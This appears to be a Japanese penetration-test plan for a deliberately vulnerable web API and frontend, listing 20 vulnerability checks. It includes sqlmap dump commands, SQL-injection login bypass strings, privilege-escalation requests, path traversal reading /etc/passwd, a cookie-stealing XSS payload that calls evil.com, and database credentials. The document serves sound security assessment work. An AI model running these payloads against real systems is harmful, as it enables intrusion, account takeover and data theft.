# 検証項目レポート

> 実施日時: 2026年02月23日
> 前工程レポート:
> - /docker-work-dir/docs/reports/01-情報収集.md
> - /docker-work-dir/docs/reports/02-アタックサーフェース定義.md
> - /docker-work-dir/docs/reports/03-スキャン.md
> - /docker-work-dir/docs/reports/04-列挙.md

---

## 1. 検証項目サマリー

### 検証対象の選定基準

前工程で列挙された31件の脆弱性候補を精査し、以下の基準で検証項目を決定しました：

| 項目 | 数 |
|------|-----|
| **検証対象** | **20件** |
| 検証不要（明白） | 8件 |
| 検証不要（誤検知） | 1件 |
| 工程外（設定レビュー） | 2件 |
| 合計脆弱性候補 | 31件 |

### リスク分布

| 重大度 | 検証項目数 |
|--------|-----------|
| Critical | 13 |
| High | 3 |
| Medium | 4 |
| Low | 0 |

### 検証手法分布

| 手法 | 検証項目数 | 備考 |
|------|-----------|------|
| OWASP ZAP アクティブスキャン | 1 | E2E テスト + Proxy収集 + Active Scan |
| sqlmap | 5 | SQLインジェクション専用ツール |
| curl | 10 | 手動検証（API直接テスト） |
| Playwright E2E + 目視確認 | 2 | XSS, Open Redirect |
| Nmap | 0 | 工程3の結果を参照（再実行なし） |
| ソースコード確認のみ | 2 | 明白な脆弱性 |

---

## 2. 検証項目一覧

### V-01: SQLインジェクション - ユーザー検索機能

- **CWE**: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **OWASP Top 10**: A03:2021 – Injection
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **対象**: `GET /api/users?search={query}`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:40`
- **使用ツール**: sqlmap
- **検証手順**:
  ```bash
  # 基本的なSQLインジェクション検証
  sqlmap -u 'http://api:5000/api/users?search=test' \
    --batch --level=3 --risk=2 \
    --flush-session \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --threads=5 \
    --output-dir=/reports/sqlmap/v01 \
    --dump-all --exclude-sysdbs
  ```
- **期待結果**: 
  - SQLインジェクションが成功し、データベース内容が抽出される
  - `users` テーブルの全データ（パスワード含む）が取得できる
- **判定基準**:
  - ✅ 脆弱性あり: sqlmapがインジェクション成功を報告し、データが抽出される
  - ❌ 脆弱性なし: インジェクションが検出されない

---

### V-02: SQLインジェクション - ユーザー詳細取得

- **CWE**: CWE-89
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `GET /api/users/{id}`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:73`
- **使用ツール**: sqlmap
- **検証手順**:
  ```bash
  # IDパラメータのSQLインジェクション検証
  sqlmap -u 'http://api:5000/api/users/1*' \
    --batch --level=3 --risk=2 \
    --flush-session \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --threads=5 \
    --output-dir=/reports/sqlmap/v02 \
    --current-db --tables
  ```
- **期待結果**: IDパラメータ経由でのSQLインジェクション成功
- **判定基準**: sqlmapによるデータベース構造の抽出成功

---

### V-03: SQLインジェクション - ユーザー作成

- **CWE**: CWE-89
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `POST /api/users`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:104-106`
- **使用ツール**: sqlmap
- **検証手順**:
  ```bash
  # POSTパラメータのSQLインジェクション検証
  sqlmap -u 'http://api:5000/api/users' \
    --data='{"username":"test","email":"test@test.com","password":"test123","role":"user"}' \
    --batch --level=3 --risk=2 \
    --flush-session \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --headers='Content-Type: application/json' \
    --threads=5 \
    --output-dir=/reports/sqlmap/v03 \
    --tamper=apostrophemask,space2comment
  ```
- **期待結果**: JSON内のパラメータ経由でSQLインジェクション成功
- **判定基準**: sqlmapによる脆弱性検出

---

### V-04: SQLインジェクション - ユーザー更新

- **CWE**: CWE-89
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.8 (Critical)
- **対象**: `PUT /api/users/{id}`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:136-144`
- **使用ツール**: sqlmap
- **検証手順**:
  ```bash
  # PUTパラメータのSQLインジェクション検証
  sqlmap -u 'http://api:5000/api/users/1' \
    --data='{"username":"test","email":"test@test.com","password":"test123","role":"user"}' \
    --batch --level=3 --risk=2 \
    --flush-session \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --headers='Content-Type: application/json' \
    --method=PUT \
    --threads=5 \
    --output-dir=/reports/sqlmap/v04
  ```
- **期待結果**: PUT経由でのSQLインジェクション成功
- **判定基準**: sqlmapによる脆弱性検出とデータ抽出成功

---

### V-05: SQLインジェクション - ログイン認証バイパス

- **CWE**: CWE-89 + CWE-287 (Improper Authentication)
- **OWASP Top 10**: A03:2021 – Injection + A07:2021 – Identification and Authentication Failures
- **カテゴリ**: インジェクション
- **推定CVSS**: 10.0 (Critical) - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **対象**: `POST /api/login`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/AuthController.cs:40`
- **使用ツール**: curl（手動検証） + sqlmap
- **検証手順**:
  ```bash
  # 手動での認証バイパステスト
  echo "=== Test 1: 認証バイパス（管理者として） ==="
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' --","password":"anything"}' \
    2>/dev/null | jq .

  echo "=== Test 2: UNION SELECT攻撃 ==="
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"'\'' UNION SELECT 1,'\''admin'\'','\''admin@example.com'\'','\''pass'\'','\''admin'\'','\'\'',now(),now() --","password":"anything"}' \
    2>/dev/null | jq .

  # sqlmapによる自動検証
  echo "=== sqlmap自動検証 ==="
  sqlmap -u 'http://api:5000/api/login' \
    --data='{"username":"admin","password":"admin123"}' \
    --batch --level=5 --risk=3 \
    --flush-session \
    --technique=BEUSTQ \
    --dbms=PostgreSQL \
    --headers='Content-Type: application/json' \
    --threads=5 \
    --output-dir=/reports/sqlmap/v05 \
    --dump-all --exclude-sysdbs
  ```
- **期待結果**: 
  - 手動テストで認証バイパスが成功（HTTPレスポンスに `X-User-Role: admin` 等が含まれる）
  - sqlmapがインジェクション成功を報告
- **判定基準**:
  - ✅ 脆弱性あり: 任意のユーザーとしてログインが成功する
  - ❌ 脆弱性なし: ログインが拒否される

---

### V-06: 認証バイパス - DELETE操作

- **CWE**: CWE-862: Missing Authorization
- **OWASP Top 10**: A01:2021 – Broken Access Control
- **カテゴリ**: 認証・認可
- **推定CVSS**: 9.1 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
- **対象**: `DELETE /api/users/{id}`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:166-187`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # テスト用ユーザー作成
  echo "=== テストユーザー作成 ==="
  RESPONSE=$(curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"deleteme","email":"delete@test.com","password":"test123","role":"user"}' \
    2>/dev/null)
  USER_ID=$(echo "$RESPONSE" | jq -r '.id')
  echo "作成されたユーザーID: $USER_ID"

  # 認証なしでDELETE実行
  echo "=== 認証なしでDELETE実行 ==="
  curl -i -X DELETE "http://api:5000/api/users/$USER_ID" 2>/dev/null

  # 削除確認（404 Not Foundが返ればDELETE成功）
  echo "=== 削除確認 ==="
  curl -s -X GET "http://api:5000/api/users/$USER_ID" 2>/dev/null | jq .
  ```
- **期待結果**: 
  - DELETE操作が認証なしで成功（HTTPステータス 200 OK）
  - 削除後のGETで 404 Not Found が返る
- **判定基準**:
  - ✅ 脆弱性あり: DELETE成功、その後のGETで404
  - ❌ 脆弱性なし: DELETE時に401/403が返る

---

### V-07: Mass Assignment - 権限昇格

- **CWE**: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- **OWASP Top 10**: A01:2021 – Broken Access Control
- **カテゴリ**: 認証・認可
- **推定CVSS**: 8.1 (High) - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **対象**: `POST /api/users`, `PUT /api/users/{id}`
- **ソースコード**: `/workdir/src/api/VulnApi/Models/User.cs:14`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 一般ユーザーとして作成し、roleフィールドで管理者権限を取得
  echo "=== Mass Assignment検証 - ユーザー作成時 ==="
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"attacker_admin","email":"attacker@evil.com","password":"hacked","role":"admin"}' \
    2>/dev/null | jq .

  # 既存ユーザーのroleを変更
  echo "=== Mass Assignment検証 - ユーザー更新時 ==="
  curl -s -X PUT http://api:5000/api/users/5 \
    -H "Content-Type: application/json" \
    -d '{"username":"yamada","email":"yamada@example.com","password":"letmein","role":"admin"}' \
    2>/dev/null | jq .

  # 権限昇格の確認
  echo "=== 権限昇格確認 ==="
  curl -s http://api:5000/api/users 2>/dev/null | jq '.[] | select(.role == "admin")'
  ```
- **期待結果**: 
  - POSTリクエストで `"role": "admin"` が指定でき、管理者ユーザーが作成される
  - PUTリクエストで一般ユーザーを管理者に昇格できる
- **判定基準**:
  - ✅ 脆弱性あり: roleフィールドが変更され、レスポンスに `"role": "admin"` が含まれる
  - ❌ 脆弱性なし: roleフィールドが無視される、または400/403エラー

---

### V-08: Stored XSS - プロフィール画像URL

- **CWE**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **OWASP Top 10**: A03:2021 – Injection
- **カテゴリ**: インジェクション
- **推定CVSS**: 9.0 (Critical) - AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
- **対象**: `GET /users/{id}` (Frontend表示)
- **ソースコード**: `/workdir/src/frontend/src/pages/UserDetail.tsx:43`
- **使用ツール**: curl + Playwright E2E（目視確認）
- **検証手順**:
  ```bash
  # XSSペイロード注入
  echo "=== XSSペイロード注入 ==="
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"xss_test","email":"xss@test.com","password":"test123","role":"user","profileImageUrl":"<script>alert(document.domain)</script>"}' \
    2>/dev/null | jq .

  # より高度なペイロード（Cookie窃取）
  echo "=== Cookie窃取ペイロード ==="
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"xss_cookie","email":"xss2@test.com","password":"test123","role":"user","profileImageUrl":"<img src=x onerror=\"fetch('\''https://evil.com?cookie='\''%2Bdocument.cookie)\">"}' \
    2>/dev/null | jq .

  # E2Eテストで確認が必要（Playwright実行）
  echo "=== E2Eテストで確認してください ==="
  echo "1. http://localhost:3000/users/{作成されたユーザーID} にアクセス"
  echo "2. アラートが表示されればXSS成功"
  ```
- **期待結果**: 
  - APIにペイロードが保存される
  - Frontendでユーザー詳細ページにアクセス時、JavaScriptが実行される
  - `dangerouslySetInnerHTML` により未サニタイズで表示される
- **判定基準**:
  - ✅ 脆弱性あり: ブラウザでアラートが表示される、またはDevToolsのコンソールでエラーが発生
  - ❌ 脆弱性なし: ペイロードがエスケープされて表示される

---

### V-09: ディレクトリトラバーサル

- **CWE**: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **OWASP Top 10**: A01:2021 – Broken Access Control
- **カテゴリ**: インフラ
- **推定CVSS**: 9.1 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **対象**: `GET /api/files/{*filePath}`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/FileController.cs:26-38`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # システムファイル読み取り
  echo "=== /etc/passwd 読み取り ==="
  curl -s "http://api:5000/api/files/..%2F..%2F..%2F..%2Fetc%2Fpasswd" 2>/dev/null | head -20

  # appsettings.json（DB接続文字列）読み取り
  echo "=== appsettings.json 読み取り ==="
  curl -s "http://api:5000/api/files/..%2Fappsettings.json" 2>/dev/null | jq .

  # Program.cs（ソースコード）読み取り
  echo "=== Program.cs 読み取り ==="
  curl -s "http://api:5000/api/files/..%2FProgram.cs" 2>/dev/null | head -30

  # 環境変数ファイル（存在する場合）
  echo "=== .env 読み取り試行 ==="
  curl -s "http://api:5000/api/files/..%2F..%2F..%2F..%2Fapp%2F.env" 2>/dev/null
  ```
- **期待結果**: 
  - `/etc/passwd` の内容が読み取れる
  - `appsettings.json` の内容が取得でき、DB接続文字列が露出
- **判定基準**:
  - ✅ 脆弱性あり: ファイル内容が返される（HTTPステータス 200）
  - ❌ 脆弱性なし: 400/403/404エラー、またはファイルが読めない

---

### V-10: 安全でないデシリアライズ（RCE）

- **CWE**: CWE-502: Deserialization of Untrusted Data
- **OWASP Top 10**: A08:2021 – Software and Data Integrity Failures
- **カテゴリ**: インフラ
- **推定CVSS**: 10.0 (Critical) - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **対象**: `POST /api/import`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/FileController.cs:58`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 基本的なデシリアライズテスト（無害なペイロード）
  echo "=== 基本デシリアライズテスト ==="
  curl -s -X POST http://api:5000/api/import \
    -H "Content-Type: application/json" \
    -d '{
      "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.Object, mscorlib]], mscorlib",
      "test": "value"
    }' 2>/dev/null | jq .

  # 注意: RCEペイロードは危険なため、本番環境では絶対に実行しないこと
  # 以下は検証用の安全なペイロード例（実行時間確認用）
  echo "=== TypeNameHandling.Allの検証（安全なペイロード） ==="
  curl -s -X POST http://api:5000/api/import \
    -H "Content-Type: application/json" \
    -d '{
      "$type": "System.Version, mscorlib",
      "_Major": 1,
      "_Minor": 0
    }' 2>/dev/null | jq .

  echo "警告: RCEペイロードの実行は危険です。TypeNameHandling.Allが有効であることが確認できれば脆弱性ありと判定してください。"
  ```
- **期待結果**: 
  - `$type` フィールドを含むJSONが受け入れられる
  - エラーが発生せず、デシリアライズが実行される
- **判定基準**:
  - ✅ 脆弱性あり: `$type` を含むペイロードが受け入れられ、レスポンスが返る
  - ❌ 脆弱性なし: 400エラー、または `$type` が無視される
- **注意**: 実際のRCEペイロードの実行は非常に危険なため、ソースコード確認（`TypeNameHandling.All`）で脆弱性を判定してください。

---

### V-11: HTTPヘッダインジェクション

- **CWE**: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')
- **OWASP Top 10**: A03:2021 – Injection
- **カテゴリ**: インジェクション
- **推定CVSS**: 6.5 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
- **対象**: `POST /api/login`
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/AuthController.cs:59-60`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # CRLF注入によるレスポンス分割
  echo "=== HTTPヘッダインジェクション検証 ==="
  curl -i -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\r\nInjected-Header: malicious","password":"admin123"}' \
    2>/dev/null | head -30

  # 改行文字のURL エンコード版
  curl -i -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin%0d%0aInjected: value","password":"admin123"}' \
    2>/dev/null | head -30

  # ヘッダ確認（X-Usernameに注入された値が含まれるか）
  echo "=== ヘッダの確認 ==="
  curl -i -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test<script>alert(1)</script>","password":"wrong"}' \
    2>/dev/null | grep -i "x-username"
  ```
- **期待結果**: 
  - レスポンスヘッダに不正な改行やHTMLタグが含まれる
  - `X-Username` ヘッダにユーザー入力がそのまま反映される
- **判定基準**:
  - ✅ 脆弱性あり: `X-Username` ヘッダにCRLFやHTMLが含まれる
  - ❌ 脆弱性なし: ヘッダが正しくエスケープされる、またはエラーが返る

---

### V-12: Open Redirect

- **CWE**: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
- **OWASP Top 10**: A01:2021 – Broken Access Control
- **カテゴリ**: インフラ
- **推定CVSS**: 6.1 (Medium) - AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- **対象**: `GET /?redirect={url}` (Frontend)
- **ソースコード**: `/workdir/src/frontend/src/pages/UserList.tsx:12-17`
- **使用ツール**: curl + ブラウザ確認
- **検証手順**:
  ```bash
  # Open Redirectの検証（curlでLocationヘッダ確認）
  echo "=== Open Redirect検証 ==="
  curl -i "http://frontend:80/?redirect=https://evil.example.com" 2>/dev/null | grep -i location

  # JavaScriptリダイレクトの確認
  echo "=== HTMLソース確認 ==="
  curl -s "http://frontend:80/?redirect=https://evil.example.com" 2>/dev/null | grep -i redirect

  # ブラウザでの確認が必要
  echo "=== ブラウザで確認してください ==="
  echo "http://localhost:3000/?redirect=https://google.com"
  echo "→ google.comにリダイレクトされれば脆弱性あり"
  ```
- **期待結果**: 
  - `?redirect=` パラメータで指定したURLにリダイレクトされる
  - JavaScriptの `window.location.href` が実行される
- **判定基準**:
  - ✅ 脆弱性あり: 外部サイトへのリダイレクトが発生
  - ❌ 脆弱性なし: リダイレクトが発生しない、またはホワイトリストでチェックされる

---

### V-13: CORS設定の不備

- **CWE**: CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- **OWASP Top 10**: A05:2021 – Security Misconfiguration
- **カテゴリ**: 設定ミス
- **推定CVSS**: 5.3 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **対象**: 全APIエンドポイント
- **ソースコード**: `/workdir/src/api/VulnApi/Program.cs:10-18`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # CORS設定の確認
  echo "=== CORS AllowAnyOrigin検証 ==="
  curl -i -H "Origin: http://evil.example.com" \
    http://api:5000/api/users 2>/dev/null | grep -i access-control

  # OPTIONSリクエストでプリフライト確認
  echo "=== Preflightリクエスト ==="
  curl -i -X OPTIONS \
    -H "Origin: http://malicious.com" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Content-Type" \
    http://api:5000/api/users 2>/dev/null | grep -i access-control

  # 実際のクロスオリジンリクエスト
  echo "=== クロスオリジンPOSTリクエスト ==="
  curl -i -X POST \
    -H "Origin: http://attacker.com" \
    -H "Content-Type: application/json" \
    -d '{"username":"csrf_test","email":"csrf@test.com","password":"test123","role":"admin"}' \
    http://api:5000/api/users 2>/dev/null | grep -i access-control
  ```
- **期待結果**: 
  - `Access-Control-Allow-Origin: *` が返される
  - すべてのオリジンからのリクエストが許可される
- **判定基準**:
  - ✅ 脆弱性あり: `Access-Control-Allow-Origin: *` または任意のOriginがそのまま返される
  - ❌ 脆弱性なし: 特定のオリジンのみ許可される

---

### V-14: データベースポート外部公開

- **CWE**: CWE-668: Exposure of Resource to Wrong Sphere
- **OWASP Top 10**: A05:2021 – Security Misconfiguration
- **カテゴリ**: インフラ
- **推定CVSS**: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **対象**: データベース (db:5432 → localhost:15432)
- **検出ツール**: Nmap（工程3で確認済み）
- **使用ツール**: psql（PostgreSQLクライアント）
- **検証手順**:
  ```bash
  # 外部からのデータベース直接接続（スキャナーコンテナ内から）
  echo "=== データベース直接接続テスト ==="
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb -c "SELECT version();" 2>/dev/null

  # ユーザー情報取得（パスワード平文）
  echo "=== ユーザー情報取得 ==="
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "SELECT id, username, email, password, role FROM users LIMIT 5;" 2>/dev/null

  # データベース一覧
  echo "=== データベース一覧 ==="
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "\l" 2>/dev/null

  # テーブル一覧
  echo "=== テーブル一覧 ==="
  PGPASSWORD=postgres123 psql -h db -p 5432 -U postgres -d vulndb \
    -c "\dt" 2>/dev/null
  ```
- **期待結果**: 
  - 認証情報（`postgres/postgres123`）で接続成功
  - データベース全体へのアクセス可能
  - ユーザーテーブルのパスワードが平文で取得できる
- **判定基準**:
  - ✅ 脆弱性あり: 接続成功、データが取得できる
  - ❌ 脆弱性なし: 接続拒否、またはポートがクローズ

---

### V-15: セキュリティヘッダーの欠如

- **CWE**: CWE-693: Protection Mechanism Failure
- **OWASP Top 10**: A05:2021 – Security Misconfiguration
- **カテゴリ**: 設定ミス
- **推定CVSS**: 5.3 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
- **対象**: Frontend (nginx), API (Kestrel)
- **検出ツール**: ZAP, Nikto（工程3で確認済み）
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Frontend のセキュリティヘッダー確認
  echo "=== Frontend セキュリティヘッダー ==="
  curl -i http://frontend:80 2>/dev/null | grep -iE "content-security-policy|x-frame-options|strict-transport-security|x-content-type-options|referrer-policy|permissions-policy"

  # API のセキュリティヘッダー確認
  echo "=== API セキュリティヘッダー ==="
  curl -i http://api:5000/api/users 2>/dev/null | grep -iE "content-security-policy|x-frame-options|strict-transport-security|x-content-type-options|referrer-policy"

  # ヘッダー一覧表示
  echo "=== Frontend 全ヘッダー ==="
  curl -i http://frontend:80 2>/dev/null | head -20

  echo "=== API 全ヘッダー ==="
  curl -i http://api:5000/api/users 2>/dev/null | head -20
  ```
- **期待結果**: 
  - 以下のヘッダーがすべて欠如している：
    - `Content-Security-Policy`
    - `X-Frame-Options`
    - `Strict-Transport-Security`
    - `X-Content-Type-Options`
    - `Referrer-Policy`
    - `Permissions-Policy`
- **判定基準**:
  - ✅ 脆弱性あり: 上記ヘッダーが1つも存在しない
  - ❌ 脆弱性なし: セキュリティヘッダーが適切に設定されている

---

### V-16: サーバーバージョン情報漏洩

- **CWE**: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **カテゴリ**: データ露出
- **推定CVSS**: 5.3 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **対象**: Frontend (nginx), API (Kestrel)
- **検出ツール**: ZAP, Nmap（工程3で確認済み）
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # Serverヘッダーの確認
  echo "=== Frontend Serverヘッダー ==="
  curl -i http://frontend:80 2>/dev/null | grep -i "^Server:"

  echo "=== API Serverヘッダー ==="
  curl -i http://api:5000/api/users 2>/dev/null | grep -i "^Server:"
  ```
- **期待結果**: 
  - Frontend: `Server: nginx/1.29.5`
  - API: `Server: Kestrel`
- **判定基準**:
  - ✅ 脆弱性あり: Serverヘッダーにバージョン情報が含まれる
  - ❌ 脆弱性なし: Serverヘッダーが削除されている、または汎用的な値

---

### V-17: 詳細エラー情報の露出

- **CWE**: CWE-209: Generation of Error Message Containing Sensitive Information
- **OWASP Top 10**: A04:2021 – Insecure Design
- **カテゴリ**: データ露出
- **推定CVSS**: 5.3 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **対象**: 全APIエンドポイント
- **ソースコード**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:57`
- **使用ツール**: curl
- **検証手順**:
  ```bash
  # 意図的にエラーを発生させる
  echo "=== エラーメッセージ確認 - 不正なID ==="
  curl -s http://api:5000/api/users/99999 2>/dev/null | jq .

  # SQLエラーの誘発
  echo "=== SQLエラーの誘発 ==="
  curl -s "http://api:5000/api/users?search=test'" 2>/dev/null | jq .

  # 不正なJSON
  echo "=== 不正なJSONボディ ==="
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{invalid json}' 2>/dev/null | jq .

  # 存在しないエンドポイント
  echo "=== 存在しないエンドポイント ==="
  curl -s http://api:5000/api/nonexistent 2>/dev/null | jq .
  ```
- **期待結果**: 
  - エラーレスポンスにスタックトレースが含まれる
  - データベース構造やファイルパスが露出する
  - 開発者例外ページの詳細情報が返る
- **判定基準**:
  - ✅ 脆弱性あり: `stackTrace`, `StackTrace`, ファイルパスなどが含まれる
  - ❌ 脆弱性なし: 汎用的なエラーメッセージのみ

---

### V-18: OWASP ZAP アクティブスキャン（包括的検証）

- **CWE**: 複数（包括的スキャン）
- **OWASP Top 10**: A01-A10（全カテゴリ）
- **カテゴリ**: 包括的検証
- **推定CVSS**: 可変（検出される脆弱性による）
- **対象**: Frontend全体 + API全体
- **使用ツール**: OWASP ZAP アクティブスキャン（Playwright E2E + ZAP Proxy + Active Scan）
- **検証手順**:
  
  **注意**: この検証は `zap-active-orchestrator` サブオーケストレーションによって自動実行されます。
  検証項目に含めることで、工程6の前に以下の処理が実行されます：
  
  1. **Playwright E2Eテスト実行**: すべての画面操作（ログイン、CRUD、検索等）をブラウザで自動実行
  2. **ZAP Proxy経由の通信収集**: E2Eテスト中の全HTTP/HTTPSリクエストを記録
  3. **アクティブスキャン実行**: 収集したURLに対して攻撃的なペイロードを自動送信
  
  スキャン対象:
  - XSS (Reflected, Stored)
  - SQLインジェクション
  - CSRF
  - セキュリティヘッダー不備
  - 認証・認可の問題
  - ディレクトリトラバーサル
  - その他OWASP Top 10項目

- **期待結果**: 
  - V-01〜V-17で検証した脆弱性の一部がZAPでも検出される
  - 新たな脆弱性が発見される可能性あり
  - 詳細なレポートが `/reports/zap-active/` に生成される

- **判定基準**:
  - ZAPが生成するレポートの `WARN-NEW` および `FAIL-NEW` の件数を確認
  - 各脆弱性の詳細を確認し、CVSSスコアと対策を評価

- **実行タイミング**: 工程6（検証フェーズ）の開始前に自動実行

---

### V-19: レート制限の欠如

- **CWE**: CWE-307: Improper Restriction of Excessive Authentication Attempts
- **OWASP Top 10**: A07:2021 – Identification and Authentication Failures
- **カテゴリ**: 設定ミス
- **推定CVSS**: 5.3 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
- **対象**: `POST /api/login`
- **使用ツール**: curl (ループ実行)
- **検証手順**:
  ```bash
  # ブルートフォース攻撃のシミュレーション（100回連続ログイン試行）
  echo "=== レート制限の検証（100回連続ログイン試行） ==="
  for i in {1..100}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://api:5000/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}" 2>/dev/null)
    echo "試行 $i: HTTPステータス $STATUS"
    
    # レート制限があれば429が返るはず
    if [ "$STATUS" == "429" ]; then
      echo "✅ レート制限が検出されました（試行 $i 回目）"
      exit 0
    fi
  done
  echo "❌ レート制限が存在しません。100回の試行すべてが処理されました。"
  ```
- **期待結果**: 
  - 100回のログイン試行がすべて処理される
  - HTTPステータス 429 (Too Many Requests) が返らない
- **判定基準**:
  - ✅ 脆弱性あり: すべてのリクエストが処理される（429が返らない）
  - ❌ 脆弱性なし: 一定回数後に429が返る

---

### V-20: SSL/TLS未使用（データベース接続）

- **CWE**: CWE-319: Cleartext Transmission of Sensitive Information
- **OWASP Top 10**: A02:2021 – Cryptographic Failures
- **カテゴリ**: 設定ミス
- **推定CVSS**: 7.4 (High) - AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
- **対象**: API → Database接続
- **ソースコード**: `docker-compose.yml`, `appsettings.json`
- **使用ツール**: ソースコード確認 + tcpdump（オプション）
- **検証手順**:
  ```bash
  # 接続文字列の確認（ソースコードから）
  echo "=== 接続文字列の確認 ==="
  grep -r "SSL Mode" /workdir/src/api/ 2>/dev/null
  grep -r "SSL Mode" /workdir/docker-compose.yml 2>/dev/null

  # (オプション) tcpdumpでパケットキャプチャ
  # データベース通信が平文で行われることを確認
  echo "=== tcpdumpでDB通信をキャプチャ（10秒間） ==="
  timeout 10s tcpdump -i any -A 'port 5432' 2>/dev/null | grep -i "SELECT\|INSERT\|UPDATE\|DELETE" || echo "tcpdumpが使用できません"

  # APIからDBへのクエリ実行中にキャプチャすることで、SQLクエリが平文で確認できる
  ```
- **期待結果**: 
  - 接続文字列に `SSL Mode=Disable` または `sslmode=disable` が含まれる
  - tcpdumpで平文のSQLクエリが確認できる
- **判定基準**:
  - ✅ 脆弱性あり: 接続文字列にSSL無効化の設定がある
  - ❌ 脆弱性なし: SSL/TLSが有効化されている

---

## 3. 検証不要項目

### 3.1 明白な脆弱性（ソースコードから確認済み）

| # | 脆弱性 | 脆弱性ID | CWE | 根拠 | 検証不要理由 |
|---|--------|---------|-----|------|-------------|
| 1 | **パスワード平文保存** | DATA-01 | CWE-256 | `/workdir/src/db/init.sql:8` - パスワードカラムが平文<br/>ハッシュ化処理なし | DBスキーマから明白。V-14のDB接続検証で実証済み |
| 2 | **APIレスポンスにパスワード含む** | DATA-02 | CWE-200 | `UsersController.cs` - パスワードフィールドがレスポンスに含まれる | APIレスポンス仕様から明白。curl確認で十分 |
| 3 | **GitHub Token ハードコード** | DATA-03 | CWE-798 | Trivyスキャンで検出済み（`.env:15`） | Trivyで既に検出済み、ファイル確認で十分 |
| 4 | **DB認証情報ハードコード** | DATA-04 | CWE-798 | `docker-compose.yml`, `appsettings.json` | ソースコードから明白 |
| 5 | **認証機構の完全欠如** | AUTH-02 | CWE-306 | すべてのコントローラーに認証属性なし | ソースコードレビューで確認済み |
| 6 | **Dockerfile 非rootユーザー未指定** | COMP-01 | CWE-250 | Trivyで検出済み（AVD-DS-0002） | Trivyで既に検出済み、Dockerfile確認で十分 |
| 7 | **開発環境設定のまま** | CONFIG-06 | CWE-489 | `ASPNETCORE_ENVIRONMENT: Development` | docker-compose.ymlから明白 |
| 8 | **認証情報のlocalStorage保存** | INFRA-05 | CWE-311 | `Login.tsx:16` - `localStorage.setItem('user', ...)` | ソースコードから明白 |

**検証不要の理由**: 
